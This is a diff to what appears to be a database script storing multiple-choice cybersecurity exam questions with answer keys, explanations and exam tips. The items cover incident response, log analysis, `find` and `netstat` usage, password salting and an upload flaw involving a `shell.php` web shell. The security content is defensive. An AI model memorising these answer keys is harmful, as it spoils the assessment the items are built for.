+            "explanation": "This is not SQL injection (which targets databases), DoS (which disrupts service), or CSRF (which exploits authenticated sessions). Clicking on a malicious link can lead to several threats:\n     *   **Drive-by Download:** The website might have attempted to *automatically download and install malware* on the user's computer *without their knowledge or consent*.  This often exploits vulnerabilities in the browser or browser plugins.\n       *   **Phishing:** The website might have been a *fake (phishing) site* designed to *trick the user into entering* their credentials or other personal information. Even if the user *didn't* enter anything, the site might have attempted to exploit browser vulnerabilities.\n\n     The *immediate actions* should be:\n      1.  *Run a full system scan with reputable anti-malware software*: To detect and remove any potential malware that might have been installed.\n       2. *Clear the browser's history, cookies, and cache*: This removes any potentially malicious cookies, temporary files, or tracking data.\n    3.  *Change passwords for any potentially affected accounts*: As a precaution, change passwords for accounts that *might* have been related to the link or that use the same password as other accounts.\n      4.  *Inspect browser extensions*: Remove any suspicious or unknown browser extensions.\n      5. *Consider running an additional scan*: Use another reputable antimalware scanner to cross check and potentially find anything missed.",
+            "examTip": "Clicking on malicious links can lead to drive-by downloads or phishing attempts; immediate scanning, clearing browser data, and password changes are crucial."
           },
           {
             "id": 44,
@@ -584,8 +584,8 @@ db.tests.updateOne(
               "File Explorer"
             ],
             "correctAnswerIndex": 1,
-            "explanation": "Notepad is a text editor—impractical for large log files. Task Manager shows running processes, not logs. File Explorer manages files/folders. While basic filtering can be done in Event Viewer, large-scale log analysis is far more efficient with **dedicated log analysis** tools or a **SIEM** (Security Information and Event Management) platform. These enable advanced filtering, correlation, and reporting across multiple systems. For a single server, Event Viewer with filtering by Event IDs (e.g., 4624/4625 for logon events) can suffice. For a major incident, a SIEM is invaluable.",
-            "examTip": "For large Windows Event Log analysis, use Event Viewer with filtering or a specialized log/SIEM tool."
+            "explanation": "Notepad is a basic text editor, unsuitable for large logs. Task Manager shows running processes, not event logs. File Explorer is for file management. While the built-in Windows *Event Viewer* *can* be used to view and filter event logs, it can be cumbersome for analyzing *large* logs and performing complex filtering. For efficient analysis of large Windows Event Logs, especially during a security investigation:\n      *  **Event Viewer (with Filtering):**  Event Viewer allows filtering by Event ID, source, level, date/time, and keywords. This is suitable for basic analysis.\n   *   **Dedicated Log Analysis Tools/SIEM:** For *large-scale* analysis and correlation across multiple systems, a *dedicated log analysis tool* or a *Security Information and Event Management (SIEM)* system is *far more effective*. These tools provide advanced filtering, searching, aggregation, correlation, and reporting capabilities, allowing you to quickly identify relevant events and patterns within massive log datasets. They can also automate alert generation based on specific event criteria.",
+            "examTip": "For large-scale Windows Event Log analysis, use Event Viewer's filtering capabilities or, preferably, a dedicated log analysis tool/SIEM."
           },
           {
             "id": 45,
@@ -597,8 +597,8 @@ db.tests.updateOne(
               "du -h"
             ],
             "correctAnswerIndex": 1,
-            "explanation": "`ls -l` doesn't filter specifically by creation time. `grep -r` looks for text matches, not creation times. `du -h` reports disk usage. The `find` command is extremely versatile; `find / -type f -ctime -1` searches for files (`-type f`) whose status changed (which includes creation) in the last day (`-1`). This helps detect potentially malicious or suspicious files added recently, which is crucial during incident response.",
-            "examTip": "Use `find` with `-ctime`, `-mtime`, or `-atime` to locate files by creation, modification, or access times."
+            "explanation": "`ls -l` lists files, but doesn't filter by creation time efficiently. `grep -r` searches for text *within* files. `du -h` shows disk usage. The `find` command is a powerful tool for locating files based on various criteria. The command `find / -type f -ctime -1` does the following:\n     *   `find /`: Starts the search from the root directory (`/`), searching the entire filesystem.\n    *   `-type f`:  Specifies that we're looking for *files* (not directories, links, etc.).\n   *  `-ctime -1`: Filters for files whose *status was changed* (including creation) in the last 1 day (`-1` means \"less than 1\"). `-ctime` refers to the inode change time (which includes creation).\n\n This command will list all *files* (not directories) that have been *created or modified* within the last 24 hours on the entire system. This is extremely useful for identifying potential malware or attacker-created files during incident response.",
+            "examTip": "Use `find` with `-ctime`, `-mtime`, or `-atime` to locate files based on their creation, modification, or access time."
           },
           {
             "id": 46,
@@ -610,8 +610,8 @@ db.tests.updateOne(
               "To ensure that the same password always produces the same hash value, regardless of the system or application."
             ],
             "correctAnswerIndex": 2,
-            "explanation": "Salting is *not* encryption. It *does* increase the complexity of brute-force attacks, but the key purpose is defeating **rainbow tables**. By adding a unique, random salt to each password, attackers cannot rely on pre-computed tables of hash-to-password mappings. Even identical passwords produce different hash values if the salts differ, forcing attackers to compute hashes from scratch each time.",
-            "examTip": "Salting passwords uniquely protects against rainbow table attacks."
+            "explanation": "Salting is *not* encryption. It *indirectly* increases resistance to brute-force attacks, but that's not its *primary* purpose. It does *not* ensure the same hash for the same password across systems; it does the *opposite*. *Salting* is a technique used to protect stored passwords. Before a password is hashed, a *unique, random string* (the salt) is *appended* to it. This means that even if two users choose the *same password*, their *salted hashes* will be *different*. This makes *pre-computed rainbow table attacks* ineffective. Rainbow tables store pre-calculated hashes for common passwords.  Because the salt is *different* for each password, the attacker would need a separate rainbow table for *every possible salt value*, which is computationally infeasible.",
+            "examTip": "Salting passwords makes rainbow table attacks ineffective and protects passwords even if the database is compromised."
           },
           {
             "id": 47,
@@ -623,8 +623,8 @@ db.tests.updateOne(
               "The web application does not use anti-CSRF tokens."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "HTTPS secures data in transit but doesn't stop malicious file uploads from being executed on the server. Strong passwords and anti-CSRF tokens address different attacks. The core issue is:\n\n* **Improper file upload handling**: The server should *never* execute user-uploaded files. They must be stored in non-executable directories.\n* **Insufficient validation**: The web app should validate file types (e.g., images only) and reject any potential code.\n\nAllowing a `.php` file to be uploaded and then executed leads to remote code execution (RCE).",
-            "examTip": "Always store user-uploaded files in a non-executable directory and strictly validate file types to prevent RCE."
+            "explanation": "While HTTPS is important for overall security, it doesn't *directly* prevent this vulnerability. Strong passwords are not directly relevant to this file upload issue. Anti-CSRF tokens prevent a different type of attack. The *core security failure* is a combination of:\n    1.  **Failure to prevent execution of user-uploaded files:** The web server should *never* execute files uploaded by users as code (e.g., PHP, ASP, JSP, etc.). This usually indicates a misconfiguration of the web server or a lack of proper file type validation.\n    2.  **Allowing uploads to an executable location:**  Uploaded files should be stored in a directory that is *not* accessible via a web URL and is *not* configured to execute scripts.\n\n   By uploading a file named `shell.php` (a *web shell*) and then accessing it via a URL, the attacker was able to execute arbitrary commands on the server. This is a *remote code execution (RCE)* vulnerability, one of the most severe types of web application vulnerabilities.",
+            "examTip": "Never allow user-uploaded files to be executed as code on the server; store them outside the webroot and validate file types thoroughly."
           },
           {
             "id": 48,
@@ -636,8 +636,8 @@ db.tests.updateOne(
               "lsof -i"
             ],
             "correctAnswerIndex": 1,
-            "explanation": "`ps aux` shows running processes but not ports. `top` shows real-time resource usage. `lsof -i` lists open Internet sockets, but it's less direct for *only* listening ports with process info. `netstat -tulnp` or `ss -tulpn` is ideal:\n\n* `-t`: TCP\n* `-u`: UDP\n* `-l`: Listening\n* `-n`: Numeric addresses\n* `-p`: PID/program name\n\nFilter or review the results to spot any *unusual* port numbers (those that are not standard for known services).",
-            "examTip": "`netstat -tulnp` (or `ss -tulpn`) shows listening ports and associated processes; check for non-standard ports in incident response."
+            "explanation": "`ps aux` lists running processes, but doesn't show network connection information. `top` displays dynamic resource usage, but not network port details. `lsof -i` lists open files, *including* network sockets, but is less directly focused on *listening* ports than `netstat` or `ss`. `netstat -tulnp` (or its modern equivalent, `ss -tulpn`) is specifically designed to display network connection information. The options provide:\n     *    `-t`: Show TCP ports.\n   *    `-u`: Show UDP ports.\n   * `-l`: Show only *listening* sockets (ports that are actively waiting for incoming connections).\n *   `-n`: Show numerical addresses (don't resolve hostnames, which is faster).\n    *    `-p`: Show the *process ID (PID)* and *program name* associated with each socket.\n\nTo identify non-standard ports, you would use this command and then *analyze the output*, looking for ports that are *not* commonly used for legitimate services (e.g., not 80, 443, 22, 25, etc.). You could combine this with `grep` or other filtering tools to focus on specific port ranges.",
+            "examTip": "`netstat -tulnp` (or `ss -tulpn`) shows listening ports and associated processes; analyze the output for non-standard ports."
           },
           {
             "id": 49,
@@ -649,8 +649,8 @@ db.tests.updateOne(
               "SOAR is only effective for large organizations with significant security budgets."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "SOAR doesn’t replace human analysts nor guarantee total prevention of attacks. It can be useful for organizations of various sizes. The primary benefit is **efficiency**. By automating routine tasks (e.g., alert triage, threat enrichment, containment actions) and orchestrating multiple security tools (SIEM, firewalls, EDR, threat intel), SOAR frees analysts to focus on complex threats, reduces human error, and speeds up incident response.",
-            "examTip": "SOAR platforms improve SOC efficiency by automating repetitive processes and integrating security tools."
+            "explanation": "SOAR *augments* and *supports* human analysts, it doesn't replace them. No tool can guarantee *complete* prevention of *all* attacks. SOAR can be beneficial for organizations of various sizes, though the specific implementation may vary. SOAR platforms are designed to improve the efficiency and effectiveness of security operations teams by:\n  * **Automating** repetitive and time-consuming tasks (e.g., alert triage, log analysis, threat intelligence enrichment, basic incident response steps).\n     *  **Integrating** (orchestrating) different security tools and technologies (e.g., SIEM, firewalls, endpoint detection and response, threat intelligence feeds) to work together seamlessly.\n       *    **Streamlining** incident response workflows (e.g., providing automated playbooks, facilitating collaboration and communication among team members, automating containment and remediation actions).\n\n   This allows security analysts to focus on more complex investigations, threat hunting, and strategic decision-making, and it reduces the time it takes to detect and respond to security incidents.",
+            "examTip": "SOAR automates, integrates, and streamlines security operations, improving efficiency and response times."
           },
           {
             "id": 50,
@@ -662,14 +662,15 @@ db.tests.updateOne(
               "Notify the user's bank and other financial institutions."
             ],
             "correctAnswerIndex": 1,
-            "explanation": "While shutting down the computer might preserve memory, it also stops immediate analysis. Changing passwords or contacting financial institutions are important *subsequent* steps if there’s evidence of compromise. The **first** action is to scan for malware. Clicking on a malicious link can lead to a drive-by download or other infections. Immediately scanning can detect and remove threats before they escalate.",
-            "examTip": "After clicking a suspicious link, first check for malware via a thorough scan; then consider changing passwords or notifying institutions if needed."
+            "explanation": "Shutting down the computer is a drastic measure that could lose volatile data *before* it's analyzed. Changing the email password and notifying financial institutions are important *precautions*, but not the *first* priority. The *most important first step* is to determine if the click resulted in a *malware infection*. Clicking a malicious link can lead to a *drive-by download*, where malware is automatically downloaded and installed on the user's computer without their knowledge. Therefore, a *full system scan* with reputable *anti-malware software* is crucial. It's also wise to consider using *specialized tools* for detecting and removing adware, browser hijackers, and other potentially unwanted programs (PUPs). After scanning, clearing browser history/cache and changing potentially compromised passwords are good follow-up steps.",
+            "examTip": "If a user clicks a suspicious link, immediately scan for malware; drive-by downloads are a significant threat."
           }
         ]
       }
     }
   }
 );
+
                                                                                                                                                  
                                                                                                                                                  
                                                                                                                                                  
